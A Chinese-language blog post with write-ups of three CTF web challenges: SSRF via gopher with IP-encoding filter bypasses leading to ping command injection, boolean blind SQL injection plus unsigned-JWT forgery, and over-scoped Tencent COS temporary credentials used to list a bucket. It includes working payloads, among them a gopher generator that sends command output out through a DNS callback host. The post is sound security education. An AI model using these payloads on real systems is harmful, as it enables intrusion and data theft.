参考资料：<https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html>、<https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/>、<https://forum.90sec.com/t/topic/129>、<https://www.anquanke.com/post/id/186186>、<https://zhuanlan.zhihu.com/p/75114351>

# 另外的几道Web

工作室学长出的几道题，学到了不少新姿势

## 1

主要考点：SSRF、命令注入

开头直接给源码：

```php
<?php
if(!(isset($_POST['url']))){
    show_source(__FILE__);
}
// include_once "ping.php";
if (isset($_POST['url'])) {
    $link = $_POST['url'];
    if(check($link)){
        $curlobj = curl_init();
        curl_setopt($curlobj, CURLOPT_POST, 0);
        curl_setopt($curlobj,CURLOPT_URL,$link);
        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($curlobj);
        curl_close($curlobj);
        echo $result;
    }else{
        echo "unknown error";
    }

}

function check($url) {
    $url = parse_url($url);
    if(isset($url['port'])){    //rewrite url if port exist
        $url['path']= ':'.$url['port'].$url['path'];
    }
    if(isset($url['scheme'])){    # filter scheme
        if(strcasecmp($url['scheme'], "ftp") === 0 || strcasecmp($url['scheme'], "telnet") === 0 || strcasecmp($url['scheme'], "dict") === 0 || strcasecmp($url['scheme'], "file") === 0 || strcasecmp($url['scheme'], "ldap") === 0){
            return FALSE;
        }
    }
    $host = $url['host'];


    if(!preg_match('/[a-zA-Z]/', $host)){
        $ip = $host;
        if(is_inner_ip_regx($ip)){
            return FALSE;
        }
    }else{
        $ip = gethostbyname($host);
        if($ip ===$host){
            return FALSE;
        }
        if(is_inner_ip_regx($ip)){
            return FALSE;
        }
    }
    return TRUE;
}

function is_inner_ip_regx($ip){
    $pattern = "/^(127\.0\.0\.1)|(localhost)|(10\.\d{1,3}\.\d{1,3}\.\d{1,3})|(172\.((1[6-9])|(2\d)|(3[01]))\.\d{1,3}\.\d{1,3})|(192\.168\.\d{1,3}\.\d{1,3})$/";
    if(preg_match($pattern, $ip)){
        return TRUE;
    }else{
        return FALSE;
    }
}
```

首先代码里面有curl，第一个想到的就是SSRF，应该可以通过这个curl做跳板来做些别的事情。然后下面的代码是针对这个curl做了一些输入过滤，一个一个来看：

### 输入过滤的缺陷

先看`check()`函数的最前面一段，它是使用了`parse_url()`来进行输入URL的解析，然后对URL使用的协议进行了一些过滤，ban了FTP、Telnet、dict://、file://和LDAP。所以这里协议部分能够使用的有HTTP、HTTPS使用SSRF的万金油Gopher。

除此之外，这里关于`parse_url()`函数还有一个小Trick：那就是当你不输入协议，直接给出IP地址时，`parse_url()`无法解析，会把整个输入全部放在path键对应的位置。下面有一段测试代码：

```php
<?php
var_dump(parse_url("http://127.0.0.1:2333/path"));
echo "<br>";
var_dump(parse_url("127.0.0.1/path"));
```

输出结果如下图，可见前者被正常解析，后者则直接全部认为是path，所以在上面的代码里面可以直接绕过。

![](https://hujiekang.top/images/uploads/big/cf097184c9782c3a4a56ccb81c015166.png)

`check()`后面的逻辑是在进行IP类型的检测，如果判断输入的URL是域名，则解析后判断是否为内网IP；如果直接输入IP则直接判断是否为内网IP。然后写了一个`is_inner_ip_regx()`函数来进行IP的判断。

深入这个函数很容易发现这个函数的过滤是很不严密的，首先本地IP并没有完全过滤，因为localhost的IP地址包括127.0.0.1 ~ 127.255.255.254 ，而这里只过滤了127.0.0.1；除此之外还有0.0.0.0，同样是可以利用的。但是难道正则表达式里面的IP就不能用了吗？显然不是，还可以通过IP的进制转换实现绕过，也能够输入任意IP地址。参考资料：<https://www.cnblogs.com/iAmSoScArEd/p/11458850.html>

### SSRF

然后就开始操作了。实际测试的时候，发现一个问题，就是HTTP协议里面的进制转换IP不能够被正确识别。测来测去，发现只有不带任何协议头时（`0x7f000001/ping.php`）和Gopher协议可以使用IP的进制转换，请求Payload：`gopher://017700000001:80/_GET%2520%252Fping.php%2520HTTP%252F1.1%250D%250AHost%253A%2520localhost%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%`（这里请求体要双重URL编码，否则请求无效，因为一共请求了两次，第一次请求根目录已经解码了一次，curl那里还有一次解码）

之前还有输入纯IP绕过`parse_url()`的方法，这里设置`url=127.0.0.1/ping.php`就可以直接发请求了，请求得到ping.php的源码：

```php
<?php

$remote_ip = $_SERVER['REMOTE_ADDR'];
if($remote_ip !== "127.0.0.1") {
    echo "Can only be accessed on localhost";
    exit();
}
show_source(__FILE__);
extract($_POST);
$ip = $ip ? $ip : "127.0.0.1";


$ip = myescapeshellarg($ip);
$cmd = "ping -c 1 $ip";
system($cmd);

function myescapeshellarg($data){
    $data = str_replace("\"","\\\"", $data);
    $data = str_replace("'","\\'", $data);
    $data = str_replace(";","", $data);
    $data = str_replace("|","", $data);
    $data = str_replace("&","", $data);
    $data = str_replace(" ","", $data);
    $data = "\"$data\"";
    return $data;
}
```

### 命令注入

看完了源码，很容易看见一个ping的命令执行过程，所以想到是命令注入。但是从源码中发现之前的一些思路又不行了，那就是因为`ping.php`里面用了`$_POST`变量覆盖，也就是说你还得传一个参数ip给`ping.php`，否则就只能ping 127.0.0.1。所以上面HTTP和不带协议头的情况（不带协议头其实默认也被认为是HTTP）都无法操作，只有Gopher可以发送完整的HTTP请求，只需要把请求报文过一个URLencode然后开头加一个`_`就可以了，写了一个脚本生成Gopher协议的Payload：

```python
import urllib.parse
data = "ip=`whoami`.ag94dn.ceye.io"
header =\
    """POST /ping.php HTTP/1.1
Host: localhost:1000
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

""".format(len(data))
header+=data
tmp = urllib.parse.quote(header)
new = tmp.replace('%0A', '%0D%0A').replace('/', '%2F')
result = '_'+new
print(urllib.parse.quote(result))
```

刚开始做的时候没有想到可以截断，所以上面脚本用的DNS查询反弹，但是发现限制有点大，只要包含空格就搞不了了，只能执行`whoami`和`uname`这种无关紧要的命令：

![](https://hujiekang.top/images/uploads/big/80498f6cf3755180978ce17d6f421609.png)

试了一堆命令，由于域名的特殊性，带一些特殊字符就挂了跑不起来，所以只能想想别的办法。然后扒了一下[之前的文章](https://www.jianshu.com/p/5e505e3d8075)，看见一个之前没认真看的东西`${IFS}`把它带进去Shell跑一下：

![](https://hujiekang.top/images/uploads/big/0b276332e85d1c0c3e067a80d3444d45.png)

好家伙，是换行符，应该可以截断，带进去<code>127.0.0.1${IFS}`ls%09-la`</code>试一下（由于输入过滤，这里的空格需要绕掉，可以使用%09代替）：

![](https://hujiekang.top/images/uploads/big/f0bbff25a4c339bca9f22a2f8f025266.png)

然后`cat /flag`直接拿到flag：

![](https://hujiekang.top/images/uploads/big/6f1c6d7a1167c1f993947acbb6d1fcbb.png)

## 2

主要考点：同表SQL注入、JWT越权

![](https://hujiekang.top/images/uploads/big/c116ee2b63df264b504a778f6dfc01b6.png)

打开就是个登录界面，找了一下没有其他的可疑点了，所以直接尝试SQL注入。

尝试`1' or 1=1#`返回`用户名或密码错误！`，尝试`1' and 1=1#`返回`attack!!!`发现存在过滤，`and`改为`&&`后返回`账号不存在！`。

fuzz一下，ban了`and select sleep regexp benchmark`：

![](https://hujiekang.top/images/uploads/big/9950064211fac4e9e8f379a576dc144f.png)

从一般注入的角度来说感觉过滤的还行，毕竟order by、union啥的都还在；但现在的问题是select给ban了，也就意味着联合查询莫得了，还有时间盲注也没有机会了，information_schema也利用不了。

已经确认了注入点，正确回显`用户名或密码错误！`，错误回显`账号不存在！`，嗦一把布尔盲注。尝试爆一波`user()`：`admin'+or+length(user())=19#`

![](https://hujiekang.top/images/uploads/big/c663ca091ddfe6983f8c0ec6a9bedaa3.png)

说明Payload没问题。如法炮制搞出来`version()`和`database()`：

```
database()=vulrange1
user()=vulrange1@localhost
version()=10.1.44-MariaDB-0ubuntu0.18.04.1
```

接下来就要想办法注数据了。由于没有select，也就不能直接查别的表，所以只能同表注入。（当然还有prepare和handler，不过这里没法用）尝试给username添加限定条件：`admin'+or+ord(substr(username,1,1))=xxx#`

爆出来两个正确结果，说明至少两个用户：

![](https://hujiekang.top/images/uploads/big/84551b7d1603c2fe34d9ac8afb6da08a.png)

同样方法爆第二位，发现每一个都只有一个返回结果，说明只有这两个用户。

然后就一个一个爆。这里需要注意一定要给每一个用户添加限定条件，限定为某一个用户的那一行，否则读出来的值就有可能串味（因为每次读出数据的顺序是不一样的，可能第一次先出的是用户1的数据，第二次先出的是用户2的数据，如果没注意就会读到一起去）

读出来的结果是admin_3022和test_user（好家伙，怪不得我输入admin显示账户不存在）

如法炮制，密码也出来了。然后学长还有给一个Hint，那就是另外两列的名字已经给出来了，很容易在HTML注释里面找到：

![](https://hujiekang.top/images/uploads/big/b9a7c60771e4ded569b153b1d40bdfd3.png)

爆出来完整的数据表如下：

|    uid     |  username  |             password             | is_admin |
| :--------: | :--------: | :------------------------------: | :------: |
| 4453445581 | admin_3022 | b44bb413ba2dc48362c20aa5ce4440d7 |    1     |
| 9983275606 | test_user  | 161d2089a4a9d169471082a536c1c410 |    0     |

可见密码是md5形式，丢到md5网站去解发现只有不是管理员的test_user可以解出来，admin的密码没办法解。

只能先登上去康康了，然后发现了一串神奇的cookie：

```http
HTTP/1.1 302 Found
Date: Sun, 18 Oct 2020 08:54:46 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI5OTgzMjc1NjA2IiwidXNlcm5hbWUiOiJ0ZXN0X3VzZXIifQ.fSC6AwHP91SjA_hp5McZeUVVHPPDKcGpn-D1qy7bqKE
Location: index.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

很清晰的JWT格式，丢到<https://jwt.io/#debugger-io>上面可以解码：

![](https://hujiekang.top/images/uploads/big/64fe94f105784106a00dfdbea36278df.png)

然后发现这个token的签名是无效的，然后我尝试自己输入密钥重新签名，然后提交请求，发现仍然可以登录上去，那么基本可以确定后端没有签名的验证机制，只是简单的读了一个用户数据而已，所以可以通过修改JWT直接越权。

那么事情就简单多了，直接换掉用户名，生成JWT往上一打，拿到flag：

![](https://hujiekang.top/images/uploads/big/f4609a0e5a06edbdf446431ef6fd678e.png)

题目做完了，后面有听学长讲解，发现这个网站实际上的数据处理逻辑和我做题时的预想不一样。我一直以为这是出题人的一个Trick，就是把正确输出的回显搞成用户名密码错误，让我们认为这是错误回显，实际上是我的思路有问题。整个网站的查询逻辑应该是这样的（伪代码）：

```
$username = waf($_POST['username']);
$password = waf($_POST['password']);
$query = SELECT uid FROM vulrange1 WHERE username=$username;
if (!$query){
	echo "账号不存在！";
}else{
	$uid = $query->uid;
	$query = SELECT * FROM vulrange1 WHERE uid=$uid AND password=$password;
	if (!$query)
		echo "用户名或密码错误！";
}
```

这样一切就说的通了：`admin' and 1=1#`由于本身就不存在`admin`这个用户，所以就不存在；`admin' or 1=1#`由于恒成立了，所以绕过了第一个进入了第二次查询里面，查到密码错误才返回用户名或密码错误。

## 3

主要考点：对象存储权限过大造成的越权访问

打开页面就是个腾讯云的对象云存储，输入一个验证码就可以注册，注册可以拿到一个token，然后用token直接登录进去就可以上传文件了。

这题最开始做的时候算是非常懵逼了，因为没有接触过云安全，所以还是在往传统的思路去想，比如挖了一下后端框架是Flask，用了客户端token可以被利用叭啦叭啦一堆，结果发现并没有什么卵用……

后面学长说是对象存储服务本身的问题，与其他东西无关，于是就去看文档，发现临时密钥相关的东西和题目中的一个接口很一致：<https://cloud.tencent.com/document/product/436/14048>

> Web、iOS、Android 使用 COS 时，通过固定密钥计算签名方式不能有效地控制权限，同时把永久密钥放到客户端代码中有极大的泄露风险。如若通过临时密钥方式，则可以方便、有效地解决权限控制问题。
> 例如，在申请临时密钥过程中，可以通过设置权限策略policy字段，限制操作和资源，将权限限制在指定的范围内。


题目里面有个接口`gen_tmp_credentials`返回的就是临时密钥的相关信息，根据页面前端的JS逻辑，可以获取到接口的返回值：

```javascript
(function () {
        // 请求用到的参数
        var protocol = location.protocol === 'https:' ? 'https:' : 'http:';
        var prefix = protocol + '//' + bucket + '.cos.' + region + '.myqcloud.com/';

        // 对更多字符编码的 url encode 格式
        var camSafeUrlEncode = function (str) {
            return encodeURIComponent(str)
                .replace(/!/g, '%21')
                .replace(/'/g, '%27')
                .replace(/\(/g, '%28')
                .replace(/\)/g, '%29')
                .replace(/\*/g, '%2A');
        };

        // 计算签名
        var getAuthorization = function (options, callback) {
            var url = 'gen_tmp_credentials';
            var xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.onload = function (e) {
                var credentials;
                try {
                    credentials = (new Function('return ' + xhr.responseText))();
                } catch (e) {}
                if (credentials) {
                    callback(null, {
                        XCosSecurityToken: credentials.sessionToken,
                        Authorization: CosAuth({
                            SecretId: credentials.tmpSecretId,
                            SecretKey: credentials.tmpSecretKey,
                            Method: options.Method,
                            Pathname: options.Pathname,
                        })
                    });
                } else {
                    console.error(xhr.responseText);
                    callback('获取签名出错');
                }
            };
            xhr.onerror = function (e) {
                callback('获取签名出错');
            };
            xhr.send("prefix=" + token);
        };

        // 上传文件
        var uploadFile = function (file, callback) {
            var Key = token + '/' + file.name; // 这里指定上传目录和文件名
            getAuthorization({Method: 'PUT', Pathname: '/' + Key}, function (err, info) {

                if (err) {
                    alert(err);
                    return;
                }

                var auth = info.Authorization;
                var XCosSecurityToken = info.XCosSecurityToken;
                var url = prefix + camSafeUrlEncode(Key).replace(/%2F/g, '/');
                var xhr = new XMLHttpRequest();
                xhr.open('PUT', url, true);
                xhr.setRequestHeader('Authorization', auth);
                XCosSecurityToken && xhr.setRequestHeader('x-cos-security-token', XCosSecurityToken);
                xhr.upload.onprogress = function (e) {
                    console.log('上传进度 ' + (Math.round(e.loaded / e.total * 10000) / 100) + '%');
                };
                xhr.onload = function () {
                    if (/^2\d\d$/.test('' + xhr.status)) {
                        var ETag = xhr.getResponseHeader('etag');
                        callback(null, {url: url, ETag: ETag});
                    } else {
                        callback('文件 ' + Key + ' 上传失败，状态码：' + xhr.status);
                    }
                };
                xhr.onerror = function () {
                    callback('文件 ' + Key + ' 上传失败，请检查是否没配置 CORS 跨域规则');
                };
                xhr.send(file);
            });
        };

        // 监听表单提交
        document.getElementById('submitBtn').onclick = function (e) {
            var file = document.getElementById('fileSelector').files[0];
            if (!file) {
                document.getElementById('msg').innerText = '未选择上传文件';
                return false;
            }
            file && uploadFile(file, function (err, data) {
                console.log(err || data);
                document.getElementById('msg').innerText = err ? err : ('上传成功!');
                location.href = "." + '?success';
            });
        };
    })();
```

然后发现CosAuth API在进行签名的时候，是把请求类型和请求路径代入进去一起签名的，也就是下面这段代码：

```javascript
callback(null, {
    XCosSecurityToken: credentials.sessionToken,
    Authorization: CosAuth({
        SecretId: credentials.tmpSecretId,
        SecretKey: credentials.tmpSecretKey,
        Method: options.Method,
        Pathname: options.Pathname,
    })
});
```

而`gen_tmp_credentials`是要求传入token的：

![](https://hujiekang.top/images/uploads/big/445ba17d5d75fbd1f7f2bb341d9c2b19.png)

所以大致可以总结为：临时密钥的生成需要token（用于确定权限范围），而拿到了临时密钥之后进行签名需要请求目录（用于确定是否处在用户的权限范围内）和请求方式的参与。

所以理论上，只要通过将token和请求方式进行正确的修改，产生了正确的签名，我们就可以进行对应的操作。

这样看上去好像也只能越权访问别人的文件而已，而且用户token还得知道，好像也没啥用；但是翻了文档之后发现对对象存储根目录的请求是对存储桶操作的一系列API，所以请求到了根目录就能够拿到任何想要的文件了。

下面有两个办法进行操作：

### 修改网站JS代码

根据腾讯云文档，把请求方法改成GET，请求根目录，相当于列出存储桶中的所有文件（由于对象存储是没有目录的概念的，每个文件都是并列的，通过Key来确定权限）

下面是我修改的代码：

```js
function getAuthorization(options, callback) {
    var url = 'gen_tmp_credentials';
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.onload = function(e) {
        var credentials;
        try {
            credentials = (new Function('return ' + xhr.responseText))();
        } catch (e) {}
        if (credentials) {
            callback(null, {
                XCosSecurityToken: credentials.sessionToken,
                Authorization: CosAuth({
                    SecretId: credentials.tmpSecretId,
                    SecretKey: credentials.tmpSecretKey,
                    Method: options.Method,
                    Pathname: options.Pathname,
                })
            });
        } else {
            console.error(xhr.responseText);
            callback('获取签名出错');
        }
    };
    xhr.onerror = function(e) {
        callback('获取签名出错');
    };
    xhr.send("prefix=");   //此处的值留空是为了保证最大权限
};

function uploadFile(information, callback) {
    console.log(information.method, information.path);
    getAuthorization({ Method: information.method, Pathname: information.path }, function(err, info) {

        if (err) {
            alert(err);
            return;
        }

        var auth = info.Authorization;
        var XCosSecurityToken = info.XCosSecurityToken;
        console.log('x-cos-security-token: ' + XCosSecurityToken + '\nAuthorization: ' + auth);
        var url = '/';
        var xhr = new XMLHttpRequest();
        xhr.open(information.method, url, true);
        xhr.setRequestHeader('Authorization', auth);
        XCosSecurityToken && xhr.setRequestHeader('x-cos-security-token', XCosSecurityToken);
        xhr.send();
    });
};

uploadFile({method:"GET", path:"/"})
```

运行结果即为对应的临时密钥，直接带入请求中就可以访问：

![](https://hujiekang.top/images/uploads/big/0e7f7deda90727870eba27443d7040e0.png)

![](https://hujiekang.top/images/uploads/big/e7b87b52a7fdcd8c28b641a135ed5fea.png)

成功显示出所有的文件键值结果。整个存储桶的文件都在这了，想下载哪个直接进行下载即可，不需要再次认证。但是如果是访问一个目录（不是真的目录，可以理解为其他用户的权限范围），就需要进行重新签名。至于为什么，我觉得可能和腾讯云官方给出的一个反面例子差不多：<https://cloud.tencent.com/document/product/436/40265>

> 反面案例三：资源与操作超范围限定
>
> 应用 C 提供一个管理工具，允许用户列出并下载所有人的文件（`app/files/*`），但只能上传和删除个人目录下的文件（`app/files/<Username>/*`），后端为了方便使用，在生成临时密钥时将2种权限，共4种操作（action）混合在一起。2种权限对应的资源路径也混合在一起，此时的临时密钥将具备资源路径中指定的更大权限，即用户可以列出、下载、上传和删除所有人的文件，恶意用户可以据此篡改或删除他人的文件，产生越权访问，用户的合法数据将暴露在风险之中。

在文件列表里面可以搜索flag，发现文件`/flag_is_here`（不是目录），重新签名后请求拿到flag：

![](https://hujiekang.top/images/uploads/big/2671e244e6c4c3733f5e08d3d86b6744.png)

### 使用CosAuth API

这个更简单一点，就是不用手动去撸代码了，直接调用API就能拿到数据。

Python好写一点，这里也就用Python了：

```python
from qcloud_cos import CosConfig
from qcloud_cos import CosS3Client
import sys
import logging
import requests

logging.basicConfig(level=logging.INFO, stream=sys.stdout)


def get_key():
    return requests.post('http://49.234.127.130:10009/gen_tmp_credentials', data={"prefix":""}, cookies={"session": ".eJwlj0tqAzEQBe-itQe61a2W5MsM6h82gQRm7FXw3TOQfVXx3m_Z84jzUe6v4x23sj-93Iv3cMY5FKd0NLdVJ7OTVa-aaZBWQy8qHWXoIhGJadOHd5nUNAaEooVKF0pMWKJEhG7AUhWbzIAIcgfGXESAuFpF1svNLLdi55H76-crvq89SKMiRedOJFnVZg_Kps6CkDPwailSu7z3Gcf_CcNu3EZsoFM2xNBNJ-MGlesyDACo5fMHyUtIuQ.X4wNtw.xLzVDirfg1LpdN72m1g1f9W-pvU"}).json()


if __name__ == '__main__':
    credentials = get_key()

    bucket = 'file-1252100769'
    region = 'ap-guangzhou'
    secret_id = credentials['tmpSecretId']
    secret_key = credentials['tmpSecretKey']

    token = credentials['sessionToken']
    scheme = 'https'
    config = CosConfig(Region=region, SecretId=secret_id, SecretKey=secret_key, Token=token, Scheme=scheme)

    client = CosS3Client(config)

    f = client.get_object(
        Bucket=bucket,
        Key='flag_is_here',
    )

    fp = f['Body'].get_raw_stream()
    print(fp.read())
```

当然还有一个办法，那就是<s>纯手写</s>，HMAC-SHA1算法，也不是很难（逃

参考资料：

- [GeekPwn-Web复盘(1)](https://blog.naive.codes/Writeup/2020-07-13-GeekPwn-Web%E5%A4%8D%E7%9B%98-1/)

- [用于前端直传 COS 的临时密钥安全指引](https://cloud.tencent.com/document/product/436/40265)
- [临时密钥生成及使用指引](https://cloud.tencent.com/document/product/436/14048)
